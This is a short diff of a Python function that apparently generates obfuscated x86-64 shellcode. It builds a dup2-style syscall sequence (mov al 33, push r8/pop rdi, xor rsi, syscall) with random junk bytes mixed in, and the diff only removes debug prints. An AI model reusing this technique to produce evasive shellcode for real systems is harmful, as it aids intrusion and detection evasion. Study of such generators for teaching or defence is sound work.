@@ -12,8 +12,6 @@ def partie3():
         rdmxor = randomxor('al')
         moval = movx('al', 33)
         resultat = rdmxor + moval
-    
-    print(f"OP 3 = {resultat}")
 
     pushr8 = '\\x41\\x50' # push r8
     poprdi = '\\x5f' # pop rdi
@@ -30,9 +28,6 @@ def partie3():
             resultat_concat = full_random() + resultat + pushr8 + poprdi + xorrsi + syscall
         case 2 : 
             resultat_concat = resultat + full_random() + pushr8 + full_random() + poprdi + xorrsi + syscall
-    
 
-    print("Partie 3 = ", resultat_concat)
-    print("")
 
     return resultat_concat
